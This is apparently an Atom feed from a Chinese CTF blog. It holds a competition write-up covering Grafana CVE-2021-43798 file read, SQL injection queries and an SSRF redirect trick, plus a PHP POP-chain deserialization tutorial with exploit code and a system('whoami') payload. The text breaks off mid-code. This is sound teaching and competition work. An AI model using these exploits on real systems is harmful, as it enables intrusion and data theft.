<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>孤独星球</title>
  
  <subtitle>H3h3QAQの博客</subtitle>
  <link href="http://h3geeker.top/atom.xml" rel="self"/>
  
  <link href="http://h3geeker.top/"/>
  <updated>2022-04-18T07:49:12.988Z</updated>
  <id>http://h3geeker.top/</id>
  
  <author>
    <name>H3h3QAQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【XCTF】第四期个人能力认证考核个人wp</title>
    <link href="http://h3geeker.top/posts/925c2943.html"/>
    <id>http://h3geeker.top/posts/925c2943.html</id>
    <published>2022-04-16T02:24:13.914Z</published>
    <updated>2022-04-18T07:49:12.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Grey"><a href="#Grey" class="headerlink" title="Grey"></a><strong>Grey</strong></h1><p>修改图片长度，然后用<code>Stegsolve</code>，在Alpha3通道可以看到两段flag</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416102615441.png" alt="image-20220416102615441"></p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416103218719.png" alt="image-20220416103218719"></p><p>然后在010末尾可以看到<code>m3_1F</code></p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416175407419.png" alt="image-20220416175407419"></p><p>连起来，flag：*<strong>CTF{Catch_m3_1F_y0u_cAn}</strong></p><h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a><strong>oh-my-grafana</strong></h1><p>CVE-2021-43798，Grafana任意文件读取漏洞</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416124417171.png" alt="image-20220416124417171"></p><p>读取Grafana配置文件拿到用户名，密码，登陆</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416124641654.png" alt="image-20220416124641654"></p><p>登陆后发现注入点，尝试注入，发现毫无过滤。。。直接一把梭</p><p>select group_concat(table_name) from information_schema.tables where table_schema = database()</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416124203340.png" alt="image-20220416124203340"></p><p>select group_concat(column_name) from information_schema.columns where table_schema = database()</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416124230587.png" alt="image-20220416124230587"></p><p>select flag from fffffflllllllllaaaagggggg</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416124251947.png" alt="image-20220416124251947"></p><p>flag：*ctf{Upgrade_your_grafAna_now!}</p><h1 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a><strong>babyweb</strong></h1><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416150613705.png" alt="image-20220416150613705"></p><p>这里能够请求资源，尝试请求本地资源发现有waf</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416150658067.png" alt="image-20220416150658067"></p><p>题目告诉了flag在/flag中</p><p><img src="/Users/h3h3qaq/Documents/CTF%E6%AF%94%E8%B5%9B/*CTF/image-20220416150741394.png" alt="image-20220416150741394"></p><p>访问提示需要ip为127.0.0.1，也就是内网ip</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416150821029.png" alt="image-20220416150821029"></p><p>第一反应想的是，写一个js，读取flag，并且弹出来</p><p>尝试不行，因为还是前端请求，随即想到了302跳转的方法</p><p>主页给了下载资源的地方，在自己的vps上用php写一个302跳转，并且起一个php服务（php -S port）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"location:http://127.0.0.1:8089/flag"</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后让服务端请求你的跳转，跳转到<code>http://127.0.0.1:8089/flag</code>，这时候就是内网资源请求，成功完成一次服务端请求伪造</p><p>然后访问下载到的资源，成功拿到flag</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220416151257643.png" alt="image-20220416151257643"></p><p>flag：*ctf{A_Easy_SSRF_YOU_KNOW}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="大赛wp" scheme="http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>POP链初探</title>
    <link href="http://h3geeker.top/posts/4458d455.html"/>
    <id>http://h3geeker.top/posts/4458d455.html</id>
    <published>2022-03-06T10:24:48.088Z</published>
    <updated>2022-03-26T04:38:07.333Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="POP链基础"><a href="#POP链基础" class="headerlink" title="POP链基础"></a>POP链基础</h1><p>Author：H3h3QAQ</p><p>之前我写了一篇PHP反序列化的基础文章</p><p>接下来我打算记录一下我的POP链构造学习过程</p><p>首先我们需要一些了解一些基础知识</p><h2 id="一、POP和POP链的定义"><a href="#一、POP和POP链的定义" class="headerlink" title="一、POP和POP链的定义"></a>一、POP和POP链的定义</h2><h3 id="1、什么是POP"><a href="#1、什么是POP" class="headerlink" title="1、什么是POP"></a>1、什么是POP</h3><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。    </p><h3 id="2、POP链原理"><a href="#2、POP链原理" class="headerlink" title="2、POP链原理"></a>2、<strong>POP链原理</strong></h3><p>POP链是反序列化漏洞利用中的一种常有方法，即寻找程序环境中已经定义或能够动态加载的对象中的属性或函数，将一些能够被调用的函数组合起来，达到目的的操作。</p><h2 id="二、POP链构造初探"><a href="#二、POP链构造初探" class="headerlink" title="二、POP链构造初探"></a>二、POP链构造初探</h2><p>在简单的反序列化漏洞利用中，我们通常寻找在源码中找寻找可以利用的魔术方法，但是关键利用点并不是魔术方法中，而是在类的方法中，在此时如果有多个类，存在可以RCE的函数，我们就可以尝试去寻找存在我们可控的变量的POP链来将其串联起来，从而达到攻击的目的。</p><h3 id="1、简单的POP链构造三部曲"><a href="#1、简单的POP链构造三部曲" class="headerlink" title="1、简单的POP链构造三部曲"></a>1、简单的POP链构造三部曲</h3><p>接下来，我们给一个简单的环境，更有利于理解</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">H3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">H3</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"I want to play basketball!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Hack</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">H3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是一个简单的环境，我们需要利用到<code>Hack</code>类中的<code>action</code>方法中的<code>eval()</code>达成RCE</p><p>接下来我们温习一下魔术方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment">//析构函数当对象被销毁时会被自动调用</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//unserialize()时会被自动调用</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatci</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于从不可访问的属性读取数据</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span>  <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//把类当作字符串使用时触发</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境中用到了<code>__construct()</code>和<code>__destruct()</code>魔术方法，我们需要牢记住每个魔术方法在什么情况下被触发。</p><p>我们来分析一下Lemon类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">H3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当Lemon类被new的时候会调用<code>__construct()</code>从而new<code>H3</code>类，然后会触发<code>__destruct()</code>方法，把<code>a</code>的指传给<code>action()</code></p><p>但是<code>H3</code>类中并没有我们能够利用的的地方，我们接下来看<code>Hack</code>类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Hack</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该类中有<code>eval</code>函数，可以被利用</p><p>到此我们的POP链已经很明确了，利用<code>Lemon    </code>类中的魔术方法去实例化<code>Hack</code>类，从而执行<code>eval()</code>，并且参数可控</p><p>exp如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Hack</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('whoami');"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">O%3A5%3A%22Lemon%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00a%22%3BO%3A4%3A%22Hack%22%3A1%3A%7Bs%3A10%3A%22%00Hack%00data%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果：</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220306192907958.png" alt="image-20220306192907958"></p><p>这就完成了一个简单的POP链构造</p><h3 id="2、CTF题目中的POP链构造"><a href="#2、CTF题目中的POP链构造" class="headerlink" title="2、CTF题目中的POP链构造"></a>2、CTF题目中的POP链构造</h3><p>经典题目<strong>Ezpop</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//当脚本尝试将对象调用为函数时触发</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 当一个对象创建时被调用</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//当一个对象被当作一个字符串被调用</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//使用unserialize时触发</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 当一个对象创建时被调用</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//用于从不可访问的属性读取数据</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了便于观看，我把每个魔术方法都做了注释在上面</p><p>接下来分析一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//当脚本尝试将对象调用为函数时触发</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以利用<code>Modifier</code>类来包含到flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 当一个对象创建时被调用</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//当一个对象被当作一个字符串被调用</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//使用unserialize时触发</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再利用<code>Show</code>类输出flag</p><p>接下来我们来找一下POP链</p><p>从<code>__wakeup()</code>开始（或者说从Show类开始）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//使用unserialize时触发</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__wakeup(</code>)先对字符串做比较，如果<code>$this-&gt;source</code>为<code>Show类</code>，则会触发<code>__toString()</code>魔术方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//当一个对象被当作一个字符串被调用</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>__toString()</code>方法会访问<code>str中的source</code>，如果<code>str</code>是<code>Test类</code>则会触发<code>__get()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//用于从不可访问的属性读取数据</span>    <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span 